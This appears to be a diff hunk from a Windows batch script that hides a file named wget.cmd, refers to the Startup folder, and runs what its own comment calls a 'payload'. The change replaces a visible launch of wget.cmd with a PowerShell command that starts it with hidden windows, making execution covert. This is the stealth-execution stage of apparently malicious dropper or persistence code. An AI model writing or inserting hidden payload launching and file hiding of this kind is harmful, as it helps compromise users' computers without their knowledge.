@@ -30,7 +30,9 @@ attrib +h wget.cmd
  
 REM run payload 
 @REM powershell -windowstyle hidden -Command "Start-Process cmd.exe -ArgumentList '/c %STARTUP%\wget.cmd' -WindowStyle Hidden"
-powershell start wget.cmd
+@REM powershell start wget.cmd
+powershell -windowstyle hidden -Command "Start-Process 'cmd.exe' -ArgumentList '/c wget.cmd' -WindowStyle Hidden"
+
 REM cd back into initial location
 REM cd /d "%INITIALPATH%"
 
